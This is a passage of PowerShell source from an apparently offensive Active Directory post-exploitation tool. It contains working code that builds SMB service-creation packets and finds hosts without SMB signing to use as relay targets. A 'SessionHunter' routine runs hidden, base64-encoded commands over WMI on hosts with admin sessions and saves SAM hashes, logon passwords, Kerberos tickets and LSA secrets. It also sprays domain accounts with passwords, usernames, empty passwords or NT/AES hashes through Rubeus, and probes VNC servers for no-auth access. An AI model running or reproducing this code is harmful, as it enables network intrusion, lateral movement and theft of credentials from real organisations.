        $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",$packet_referent_ID)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",$packet_command)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SCMCreateServiceW
    }

    function Get-PacketSCMStartServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SCMStartServiceW
    }

    function Get-PacketSCMDeleteServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCMDeleteServiceW
    }

    function Get-PacketSCMCloseServiceHandle()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCM_CloseServiceW
    }

    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
    $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
    $process_ID = $process_ID -replace "-00-00",""
    [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    function Get-SMBSigningStatus
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version)

        if($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_client_receive = New-Object System.Byte[] 1024
        $SMB_client_stage = 'NegotiateSMB'
        
        :SMB_relay_challenge_loop while($SMB_client_stage -ne 'exit')
        {
        
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_version = 'SMB1'
                        $SMB_client_stage = 'NTLMSSPNegotiate'
                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'
                    }

                    if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03'))
                    {
                        $SMBSigningStatus = $true
                        
                    } else {
                        $SMBSigningStatus = $false
                    }
                    $SMB_relay_socket.Close()
                    $SMB_client_receive = $null
                    $SMB_client_stage = 'exit'

                }
            
            }

        }
        return $SMBSigningStatus
    }

    if($Target) {
        $Targets += $Target
    }
    foreach ($Target in $Targets) {
        $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
        $SMB_relay_socket.Client.ReceiveTimeout = 3000
        $SMB_relay_socket.Connect($Target,"445")
        $HTTP_client_close = $false
        if(!$SMB_relay_socket.connected)
        {
        "$Target is not responding"
        }
        $SigningStatus = Get-SMBSigningStatus $SMB_relay_socket 'smb2'
        if ($SigningStatus){
            "Signing Enabled"
        } else {
            "Signing Not Required"
        }
        if ($Delay) {
            $Jitter = get-random -Minimum 0 -Maximum $DelayJitter
            sleep ($Delay+$Jitter)
        }
    }

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

Function GenRelayList {
    
    Write-Host
    $ErrorActionPreference = "SilentlyContinue"
    Get-SMBSigning
    
    foreach ($Computer in $Computers) {
    $OS = $computer.Properties["operatingSystem"][0]
    $ComputerName = $computer.Properties["dnshostname"][0]

$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {continue}   elseif ($Connected){

        if ($Method -eq "GenRelayList") {
            $Signing = Get-SMBSigning -Target $ComputerName

            if ($Signing -match "Signing Enabled") {
                if ($SuccessOnly) {
                    continue
                } elseif (!$SuccessOnly) {
                    Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                }
            }

            if ($Signing -match "Signing Not Required") {
                $ComputerName | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append
                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
            }
        }

        if ($Method -eq "GenRelayList") {
            $SigningUnique = Get-Content -Path "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique | Sort
            Set-Content -Value $SigningUnique -Path "$SMB\SigningNotRequired-$Domain.txt" -Force
        }
    }
}

}

################################################################################################################
############################################ Function: SessionHunter ###########################################
################################################################################################################
Function Invoke-SessionHunter {
Write-host

Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)

    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if (!$connected) {return}
    
    $osInfo = $null
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
    if (!$osInfo){return}


    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)


function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    function SessionHunter {
        param($ComputerName, $Command)

        $userSIDs = @()
        $domainCache = @{}
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $adminPresent = $false

        function GetDomainFQDNFromSID {
            param($sid)
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
            $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
            if (-not $domainCache[$objDomain]) {
                try {
                    $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                    $domainCache[$objDomain] = $FQDN
                } catch {
                    return $objDomain
                }
            }
            return $domainCache[$objDomain]
        }

        try {
            $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        } catch {
            return
        }

        $userKeys = $remoteRegistry.GetSubKeyNames()

        foreach ($key in $userKeys) {
            if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                $userSIDs += $key
            }
        }

        $remoteRegistry.Close()

        foreach ($sid in $userSIDs) {
            try {
                $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                $username = $userTranslation.Value.Split('\')[1]
                
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $adminPresent = $true
                    break
                }
            } catch {}
        }

        if ($adminPresent) {
            if ($Command -eq ""){
            # We can just return as OSinfo was checked earlier in script
            return "Successful connection PME"
            
            }
            elseif ($Command -ne ""){

            return WMI $ComputerName -command $Command
            
            }
        }

    }

   SessionHunter -ComputerName $computerName -command $Command

}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SessionHunter " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            $result = $result.Trim()

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })



# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################## Function: Spray #############################################
################################################################################################################
Function Spray {
Write-host

            
# Create a directory entry for the specified domain
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
$searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

# Set the filter to query the domainDNS object
$searcher.Filter = "(objectClass=domainDNS)"
$domainObject = $searcher.FindOne()

if ($domainObject.Properties.Contains("lockoutThreshold")) {
    $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
    # Check the lockout threshold value
    $LO_threshold = $lockoutThreshold

    if ($LO_threshold -eq "0") {
        $SafeLimit = 100000
    } elseif ($LO_threshold -lt 3) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Lockout threshold is 2 or less. Aborting..."
        return
    } elseif ($LO_threshold -lt 4) {
        $SafeLimit = 1
    } else {
        $SafeLimit = $LO_threshold - 2
    }
} else {
            
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Threshold not found. Aborting..."
        return
}

# gut this out and replace with the new function
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

# Display the $SafeLimit value
Write-Output " - Lockout Threshold  : $LO_threshold"
Write-Output " - Safety Limit value : $SafeLimit"
Write-Output " - Removed disabled accounts from spraying"

if ($SprayHash -ne ""){
    Write-Host
    $SprayPassword = ""
    $AccountAsPassword = $False

    if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64) {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        return
    }

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with Hash value: $SprayHash"
    Write-Host

}

if ($SprayPassword -ne ""){
    $SprayHash = ""
    $AccountAsPassword = $False

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with password value: $SprayPassword"
    Write-Host

}


if ($AccountAsPassword){
    $SprayHash = ""
    $SprayPassword = ""

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying usernames as passwords"
    Write-Host
}

if ($EmptyPassword){
    $SprayPassword = ""
    $SprayHash = ""
    $AccountAsPassword = $False     
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying empty passwords"
    Write-Host
}


foreach ($UserToSpray in $EnabledDomainUsers){
		$Delay = Get-Random -Minimum 8 -Maximum 90
		Start-Sleep -Milliseconds $Delay
 
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
$searchResult = $searcher.FindOne()
        $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

            if ($badPwdCount -ge $SafeLimit){
                if (!$SuccessOnly){
                    Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Safe threshold met"
                    continue
    }
}
           # Hash Spraying
            if ($SprayHash -ne ""){
            if ($SprayHash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain" | Out-String}
            elseif ($SprayHash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain" | Out-String}
            
            # Check for Unhandled Rubeus exception
            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }    
            } 
            # Check for KDC_ERR_PREAUTH_FAILED
            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }   
            }
            # Check for TGT request success
            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$Domain\$UserToSpray"
                "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
        }
    }

    # Password Spraying
   if ($SprayPassword -ne ""){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$SprayPassword)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # Account as password
    if ($AccountAsPassword){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$UserToSpray)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # EmptyPasswords
    if ($EmptyPassword){
    $password = ""
       
        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            }
        }
    
    }
}

################################################################################################################
################################################## Function: VNC ###############################################
################################################################################################################
Function Method-VNC {

if ($Port -eq ""){$Port = "5900"} else {$Port = $Port}

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($ComputerName, $Port)

      $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }


    if (!$connected) {$tcpClient.Close() ; return}

function VNC-NoAuth {
    param(
        [string]$ComputerName,
        [int]$Port
    )
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
    }
    catch {
        Write-Host "Error: Unable to connect to $ComputerName on port $Port"
        return "Connection Error"
    }

    try {
        $networkStream = $tcpClient.GetStream()
        $networkStream.ReadTimeout = 50
        
        # Reading Version from Server
        $buffer = New-Object byte[] 12
        $read = $networkStream.Read($buffer, 0, 12)
        if ($read -eq 0) { throw "No data received from the server" }
        $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
        # Sending Client Version
        $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
        $networkStream.Write($buffer, 0, $buffer.Length)

        # Reading Supported Security Types
        $buffer = New-Object byte[] 2
        $read = $networkStream.Read($buffer, 0, 1)
        if ($read -eq 0) { throw "No data received from the server" }
        $numberOfSecTypes = $buffer[0]
        $buffer = New-Object byte[] $numberOfSecTypes
        $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
        if ($read -eq 0) { throw "No data received from the server" }
    }
    catch {
        Write-Host "Error: Handshake failed with $ComputerName on port $Port"
        return "Handshake Error"
    }
    finally {
        # Cleanup
        if ($null -ne $networkStream) { $networkStream.Close() }
        if ($null -ne $tcpClient) { $tcpClient.Close() }
    }

    # Check for Non-authentication (Type 1)
    if ($buffer -contains 1) {
        return "Supported"
    }
    else {
        return "Not Supported"
    }
}

$AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
return "$AuthSupported"


}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "VNC " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
